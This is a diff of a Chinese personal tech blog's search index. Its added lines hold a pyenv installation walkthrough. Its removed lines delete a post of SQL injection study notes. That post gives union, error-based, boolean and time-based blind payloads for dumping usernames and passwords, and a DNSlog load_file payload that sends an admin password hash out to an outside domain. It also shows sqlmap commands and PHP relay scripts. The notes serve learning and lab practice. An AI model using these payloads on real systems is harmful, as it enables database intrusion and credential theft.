+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[python@iZuf6fkxk1equ6kjtxh1u3Z .pyenv]$ mkdir cache</span><br></pre></td></tr></table></figure>
+<p>直接使用pyenv下载环境速度很慢，推荐本地主机提前下载好python版本后scp上传服务器<br>（之前没用密钥认证可以使用kali，后续使用密钥认证后使用xshell的本地终端上传，但每次需要认证ssh密钥，有点麻烦）</p>
+<h1 id="scp文件上传"><a href="#scp文件上传" class="headerlink" title="scp文件上传"></a>scp文件上传</h1><p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>
+<h1 id="查看配置"><a href="#查看配置" class="headerlink" title="查看配置"></a>查看配置</h1><p>确认pyenv和virtualenv-init是否配置完成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which virtualenv-init</span><br><span class="line">/usr/bin/which: no virtualenv-init in (/root/.pyenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"></span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which pyenv</span><br><span class="line">pyenv ()</span><br><span class="line">&#123; </span><br><span class="line">    local command;</span><br><span class="line">    command=&quot;$&#123;1:-&#125;&quot;;</span><br><span class="line">    if [ &quot;$#&quot; -gt 0 ]; then</span><br><span class="line">        shift;</span><br><span class="line">    fi;</span><br><span class="line">    case &quot;$command&quot; in </span><br><span class="line">        activate | deactivate | rehash | shell)</span><br><span class="line">            eval &quot;$(pyenv &quot;sh-$command&quot; &quot;$@&quot;)&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *)</span><br><span class="line">            command pyenv &quot;$command&quot; &quot;$@&quot;</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="安装编译环境和依赖工具"><a href="#安装编译环境和依赖工具" class="headerlink" title="安装编译环境和依赖工具"></a>安装编译环境和依赖工具</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# sudo yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">/usr/lib/python3.6/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.</span><br><span class="line">  from cryptography import x509</span><br><span class="line"></span><br><span class="line">Failed loading plugin &quot;spacewalk&quot;: module &#x27;lib&#x27; has no attribute &#x27;X509_V_FLAG_CB_ISSUER_CHECK&#x27;</span><br><span class="line">Last metadata expiration check: 2:54:19 ago on Wed 10 Jul 2024 05:25:19 PM CST.</span><br><span class="line">Dependencies resolved.</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装python环境"><a href="#安装python环境" class="headerlink" title="安装python环境"></a>安装python环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv install 3.10.0</span><br><span class="line">WARNING: Please make sure you remove any previous custom paths from your /root/.pydistutils.cfg file.</span><br><span class="line">Installing Python-3.10.0...</span><br><span class="line">patching file aclocal.m4</span><br><span class="line">patching file configure</span><br><span class="line">Hunk #5 succeeded at 10537 (offset -15 lines).</span><br><span class="line">patching file Misc/NEWS.d/next/Build/2021-10-11-16-27-38.bpo-45405.iSfdW5.rst</span><br><span class="line">patching file configure</span><br><span class="line">patching file configure.ac</span><br><span class="line">Installed Python-3.10.0 to /root/.pyenv/versions/3.10.0</span><br></pre></td></tr></table></figure>
+<h1 id="设置为全局"><a href="#设置为全局" class="headerlink" title="设置为全局"></a>设置为全局</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv global 3.10.0</span><br></pre></td></tr></table></figure>
+<h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# python -V</span><br><span class="line">Python 3.10.0</span><br></pre></td></tr></table></figure>
+
+
 ]]></content>
       <categories>
-        <category>Web安全</category>
+        <category>Python</category>
       </categories>
       <tags>
-        <tag>JWT Vulnerabilitiy</tag>
+        <tag>pyenv</tag>
       </tags>
   </entry>
   <entry>
@@ -731,40 +765,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pyenv 简单使用记录</title>
-    <url>/posts/199c3661.html</url>
-    <content><![CDATA[<h1 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pyenv项目（我是下载pyenv然后解压到root下，plugin插件没有virtualenv-init，后面用git下载）</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ~]$ git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br></pre></td></tr></table></figure>
-<h1 id="bashrc环境配置"><a href="#bashrc环境配置" class="headerlink" title=".bashrc环境配置"></a>.bashrc环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;export PATH=&quot;$HOME/.pyenv/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init --path)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv virtualenv-init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
-<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p>更新出错显示没有virtualenv-init</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# source /root/.bashrc</span><br><span class="line">pyenv: no such command `virtualenv-init&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>这个命令可以将下载的插件直接放入pyenv的plugin插件文件夹下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# git clone https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenv</span><br><span class="line">Cloning into &#x27;/root/.pyenv/plugins/pyenv-virtualenv&#x27;...</span><br><span class="line">remote: Enumerating objects: 2301, done.</span><br><span class="line">再次更新成功</span><br></pre></td></tr></table></figure>
-<h1 id="本地缓存加快python包解压缩"><a href="#本地缓存加快python包解压缩" class="headerlink" title="本地缓存加快python包解压缩"></a>本地缓存加快python包解压缩</h1><p>创建cache文件夹缓存下载好的python压缩包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[python@iZuf6fkxk1equ6kjtxh1u3Z .pyenv]$ mkdir cache</span><br></pre></td></tr></table></figure>
-<p>直接使用pyenv下载环境速度很慢，推荐本地主机提前下载好python版本后scp上传服务器<br>（之前没用密钥认证可以使用kali，后续使用密钥认证后使用xshell的本地终端上传，但每次需要认证ssh密钥，有点麻烦）</p>
-<h1 id="scp文件上传"><a href="#scp文件上传" class="headerlink" title="scp文件上传"></a>scp文件上传</h1><p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>
-<h1 id="查看配置"><a href="#查看配置" class="headerlink" title="查看配置"></a>查看配置</h1><p>确认pyenv和virtualenv-init是否配置完成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which virtualenv-init</span><br><span class="line">/usr/bin/which: no virtualenv-init in (/root/.pyenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"></span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which pyenv</span><br><span class="line">pyenv ()</span><br><span class="line">&#123; </span><br><span class="line">    local command;</span><br><span class="line">    command=&quot;$&#123;1:-&#125;&quot;;</span><br><span class="line">    if [ &quot;$#&quot; -gt 0 ]; then</span><br><span class="line">        shift;</span><br><span class="line">    fi;</span><br><span class="line">    case &quot;$command&quot; in </span><br><span class="line">        activate | deactivate | rehash | shell)</span><br><span class="line">            eval &quot;$(pyenv &quot;sh-$command&quot; &quot;$@&quot;)&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *)</span><br><span class="line">            command pyenv &quot;$command&quot; &quot;$@&quot;</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="安装编译环境和依赖工具"><a href="#安装编译环境和依赖工具" class="headerlink" title="安装编译环境和依赖工具"></a>安装编译环境和依赖工具</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# sudo yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">/usr/lib/python3.6/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.</span><br><span class="line">  from cryptography import x509</span><br><span class="line"></span><br><span class="line">Failed loading plugin &quot;spacewalk&quot;: module &#x27;lib&#x27; has no attribute &#x27;X509_V_FLAG_CB_ISSUER_CHECK&#x27;</span><br><span class="line">Last metadata expiration check: 2:54:19 ago on Wed 10 Jul 2024 05:25:19 PM CST.</span><br><span class="line">Dependencies resolved.</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装python环境"><a href="#安装python环境" class="headerlink" title="安装python环境"></a>安装python环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv install 3.10.0</span><br><span class="line">WARNING: Please make sure you remove any previous custom paths from your /root/.pydistutils.cfg file.</span><br><span class="line">Installing Python-3.10.0...</span><br><span class="line">patching file aclocal.m4</span><br><span class="line">patching file configure</span><br><span class="line">Hunk #5 succeeded at 10537 (offset -15 lines).</span><br><span class="line">patching file Misc/NEWS.d/next/Build/2021-10-11-16-27-38.bpo-45405.iSfdW5.rst</span><br><span class="line">patching file configure</span><br><span class="line">patching file configure.ac</span><br><span class="line">Installed Python-3.10.0 to /root/.pyenv/versions/3.10.0</span><br></pre></td></tr></table></figure>
-<h1 id="设置为全局"><a href="#设置为全局" class="headerlink" title="设置为全局"></a>设置为全局</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv global 3.10.0</span><br></pre></td></tr></table></figure>
-<h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# python -V</span><br><span class="line">Python 3.10.0</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>pyenv</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shiro反序列化漏洞(CVE-2016-4437)复现</title>
     <url>/posts/79c4731b.html</url>
     <content><![CDATA[<p>摘:<a href="https://blog.csdn.net/dreamthe/article/details/124390531">https://blog.csdn.net/dreamthe/article/details/124390531</a></p>
@@ -794,117 +794,6 @@
     <title>sqli-labs靶场练习</title>
     <url>/posts/d642dfa0.html</url>
     <content><![CDATA[<p>虽然之前通关过一次但已历史久远，未来如果有机会再来一次的话我一定截图</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>sql-inject</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入知识记录</title>
-    <url>/posts/ccd55f3a.html</url>
-    <content><![CDATA[<h1 id="sql注入漏洞基本原理"><a href="#sql注入漏洞基本原理" class="headerlink" title="sql注入漏洞基本原理"></a>sql注入漏洞基本原理</h1><p>Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。<br>可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。</p>
-<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><p>根据注入技术分类有以下五种：</p>
-<div class="note info no-icon flat"><p>布尔型盲注：根据返回页面判断条件真假</p>
-<p>时间型盲注：用页面返回时间是否增加判断是否存在注入</p>
-<p>基于错误的注入：页面会返回错误信息</p>
-<p>联合查询注入：可以使用union的情况下</p>
-<p>堆查询注入：可以同时执行多条语句</p>
-</div>
-
-<p>根据数据获取分类有以下三种：</p>
-<div class="note info no-icon flat"><p>inband<br>利用Web应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>
-<p>inference<br>通过Web的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过web应用的其他改变来推断数据。</p>
-<p>out of band (OOB)<br>通过其他传输方式来获得数据，比如DNS解析协议和电子邮件，如dnslog注入</p>
-</div>
-
-
-
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>使用参数化查询。</p>
-<p>数据库服务器不会把参数的内容当作SQL指令的一部分来拼接执行；</p>
-<p>而是在数据库完成SQL指令的编译后才套用参数运行(预编译)。</p>
-<p>避免数据变成代码被执行，时刻分清代码和数据的界限。</p>
-<h1 id="mysql基础知识"><a href="#mysql基础知识" class="headerlink" title="mysql基础知识"></a>mysql基础知识</h1><p>MySQL默认的数据库有<br>sys、mysql、performance_schema、information_schema；<br>information_schema存放着所有的数据库信息(5.0版本以上才有这个库)<br>这个库有三个表：</p>
-<div class="note info no-icon flat"><p>SCHEMATA 该表存放用户创建的所有数据库库名<br>SCHEMA_NAME 字段记录数据库库名<br>TABLES 该表存放用户创建的所有数据库库名和表名<br>TABLE_SCHEMA 字段记录数据库名<br>TABLE_NAME 字段记录表名<br>COLUMNS 该表存放用户创建的所有数据库库名、表名和字段名<br>TABLE_SCHEMA 字段记录数据库名<br>TABLE_NAME 字段记录表名<br>COLUMN_NAME 字段记录字段名</p>
-</div>
-
-<h1 id="sql注入漏洞查找"><a href="#sql注入漏洞查找" class="headerlink" title="sql注入漏洞查找"></a>sql注入漏洞查找</h1><h2 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h2><p>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE参数<br>X-Forwarded-For<br>文件名</p>
-<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 字符型不一定单引号闭合，可能单引号，双引号，括号排列组合</span><br><span class="line">字符型</span><br><span class="line">?id=1&#x27;		页面返回正常</span><br><span class="line">?id=1 		页面返回不正常</span><br><span class="line"></span><br><span class="line">### 数字型</span><br><span class="line">?id=1 and 1=1		页面返回正常</span><br><span class="line">?id=1 and 1=2		页面返回不正常</span><br></pre></td></tr></table></figure>
-
-<h2 id="测试列数"><a href="#测试列数" class="headerlink" title="测试列数"></a>测试列数</h2><p>以数字型举例  列数为四</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by2	--+返回正常</span><br><span class="line">?id=1 order by 3#			--返回正常</span><br><span class="line">?id=1 order by 4#			--返回正常</span><br><span class="line">?id=1 order by 5#			--返回错误</span><br></pre></td></tr></table></figure>
-<h1 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h1><h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version())#</span><br></pre></td></tr></table></figure>
-<h2 id="获取表信息"><a href="#获取表信息" class="headerlink" title="获取表信息"></a>获取表信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,table_name from information_schema.tables where table_schema=&#x27;db_name&#x27; limit 0,1#</span><br></pre></td></tr></table></figure>
-<h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,column_name from information_schema.columns where table_schema=%27数据库名%27 and table_name=%27表名%27limit 0,1#</span><br></pre></td></tr></table></figure>
-<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(name,password) from column_name#</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>判断是否存在报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1/0</span><br></pre></td></tr></table></figure>
-<h2 id="基于主键冲突报错"><a href="#基于主键冲突报错" class="headerlink" title="基于主键冲突报错"></a>基于主键冲突报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
-<h2 id="xpath路径报错"><a href="#xpath路径报错" class="headerlink" title="xpath路径报错"></a>xpath路径报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1, concat(0x5c,(select user())))</span><br><span class="line">updatexml(0x3a,concat(1,(select user())),1)</span><br><span class="line">exp(~(SELECT * from(select user())a))</span><br></pre></td></tr></table></figure>
-
-<h2 id="GTID-SUBSET-GTID-SUBTRACT-暂未尝试"><a href="#GTID-SUBSET-GTID-SUBTRACT-暂未尝试" class="headerlink" title="GTID_SUBSET &amp;&amp; GTID_SUBTRACT(暂未尝试)"></a>GTID_SUBSET &amp;&amp; GTID_SUBTRACT(暂未尝试)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GTID_SUBSET(version(), 1)</span><br><span class="line">GTID_SUBSET</span><br><span class="line">?id=1&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class="line">GTID_SUBTRACT</span><br><span class="line">?id=1&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>
-
-<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>页面无查询信息数据返回，通过页面响应判断是否存在注入<br>以下手工测试数量过于麻烦，可配合bp的intruder模块爆破</p>
-<p>判断数据库名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+</span><br><span class="line">1&#x27;and length(database())&gt;=13--+</span><br><span class="line">1&#x27;and length(database())&gt;=14--+</span><br></pre></td></tr></table></figure>
-
-<h2 id="猜测数据库名"><a href="#猜测数据库名" class="headerlink" title="猜测数据库名"></a>猜测数据库名</h2><p>使用逐字符判断的方式获取数据库名；<br>数据库名的范围一般在a<del>z、0</del>9之内，可能还会有特殊字符 “_”、”-“ 等，这里的字母不区分大小写。<br>substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>也可以使用ascii码判断</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
-
-<h2 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h2><p>修改1,1前边的1到20，逐字符猜解出第一个字段的名<br>修改limit的0,1前边的0到20，逐个猜解每个字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
-<h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
-
-<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。<br>可以用benchmark，sleep等造成延时效果的函数。<br>如果benkchmark和sleep关键字被过滤了，可以让两个非常大的数据表做笛卡尔积 (opens new window)产生大量的计算从而产生时间延迟；<br>或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and sleep(5) and 1=1--+	页面返回不正常，延时5秒</span><br><span class="line">&#x27; and sleep(5) and 1=2--+	页面返回不正常，不延时</span><br><span class="line"></span><br><span class="line">and if(length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure>
-
-<h2 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
-
-<h1 id="DNSlog盲注"><a href="#DNSlog盲注" class="headerlink" title="DNSlog盲注"></a>DNSlog盲注</h1><p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；<br>DNSlog就是记录用户访问网站域名时，记录DNS和对应的IP的转换访问日志；<br>MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；<br>通过SQL执行后，将内容输出到DNSlog中记录起来，然后我们可以在DNSlog平台查询回显数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,load_file(CONCAT(&#x27;\\&#x27;,(SELECT hex(pass) FROM user WHERE name=&#x27;admin&#x27; LIMIT 1),&#x27;.mysql.wintrysec.ceye.io\abc&#x27;))</span><br><span class="line">--Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span><br></pre></td></tr></table></figure>
-<h1 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>注入的参数被加密，使用sqlmap的tamper脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.com/?id=MQ== --tamper base64encode.py --dbs</span><br></pre></td></tr></table></figure>
-
-<h1 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h1><h2 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h2><p>若参数名也被加密，比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。<br>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.sqlmap注入本地搭建的服务器中转脚本<br>2.中转脚本接收sqlmap注入过来的payload,根据配置进行编码<br>3.将payload与目标地址进行拼接请求该URL</p>
-<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit(0); </span><br><span class="line">$id=$_GET[&quot;id&quot;]; 	//自定义使用base64_encode编码</span><br><span class="line">$id=str_replace(&quot; &quot;,&quot;%20&quot;,$id); </span><br><span class="line">$id=str_replace(&quot;=&quot;,&quot;%3D&quot;,$id); </span><br><span class="line">$url = &quot;http://xxxx?&amp;daxxtae=null&amp;parame=$id&quot;;</span><br><span class="line">echo $url;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;$url&quot;); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); //https请求 不验证hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXY, &#x27;proxy.xxxx.com&#x27;); //代理服务器地址,vps可以不加</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXYPORT, &#x27;8080&#x27;); //代理服务器端口,vps可以不加</span><br><span class="line">$output = curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line">print_r($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>sqlmap</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http://127.0.0.1/shell.php?&amp;daxxtae=null&amp;param=xxx&quot; --batch --delay=1 --random-agent --dbs</span><br></pre></td></tr></table></figure>
-
-<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;http://192.168.1.104/sqli/Less-11/index.php&quot;;</span><br><span class="line">$sql = $_GET[s];//获取中转脚本传过来的payload </span><br><span class="line">$s = urlencode($sql);</span><br><span class="line">$params = &quot;uname=admin$s&amp;passwd=aa&quot;;</span><br><span class="line">$ch = curl_init();// 创建一个新cURL资源</span><br><span class="line"> curl_setopt($ch, CURLOPT_URL, $url);//这是你想用PHP取回的URL地址，可以在用curl_init()函数初始化时设置这个选项</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值   </span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;);// 在HTTP请求中自定义一个”user-agent”头的字符串</span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, 15);//为了应对目标服务器的过载，下线，或者崩溃等可能状况。</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">// 抓取URL并把它传递给浏览器 </span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch);</span><br><span class="line">$a = strlen($output);</span><br><span class="line">//echo $a;</span><br><span class="line">if($a==2846)&#123;</span><br><span class="line">    echo &quot;1&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;2&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>sqlmap</p>
